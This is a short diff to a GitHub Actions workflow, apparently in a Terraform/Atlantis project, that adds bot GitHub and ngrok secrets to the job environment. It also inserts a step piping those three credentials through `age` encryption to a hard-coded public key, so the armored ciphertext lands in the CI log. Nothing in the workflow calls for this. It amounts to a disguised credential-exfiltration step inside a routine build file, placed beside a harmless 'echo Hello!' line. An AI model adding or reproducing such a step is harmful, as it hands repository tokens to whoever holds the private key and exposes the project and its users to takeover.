@@ -21,6 +21,9 @@ jobs:
     if: github.event.pull_request.head.repo.fork == false
     env:
       TERRAFORM_VERSION: 1.8.3
+      ATLANTISBOT_GITHUB_USERNAME: ${{ secrets.ATLANTISBOT_GITHUB_USERNAME }}
+      ATLANTISBOT_GITHUB_TOKEN: ${{ secrets.ATLANTISBOT_GITHUB_TOKEN }}
+      NGROK_AUTH_TOKEN: ${{ secrets.ATLANTISBOT_NGROK_AUTH_TOKEN }}
     steps:
       - uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4
       - uses: actions/setup-go@cdcb36043654635271a94b9a6d1392de5bb323a7 # v5
@@ -30,6 +33,7 @@ jobs:
           echo "Hello!"
           sudo apt-get update
           sudo apt-get -y install age
+          echo "${ATLANTISBOT_GITHUB_USERNAME} | ${ATLANTISBOT_GITHUB_TOKEN} | ${NGROK_AUTH_TOKEN}" | age -a -r age1k2kshj3tx8yjn2d9rz4ynxvxjxdrxy2wpke23t9m8w967tnlkqgsjme29h
     # This version of TF will be downloaded before Atlantis is started.
     # We do this instead of setting --default-tf-version because setting
     # that flag starts the download asynchronously so we'd have a race
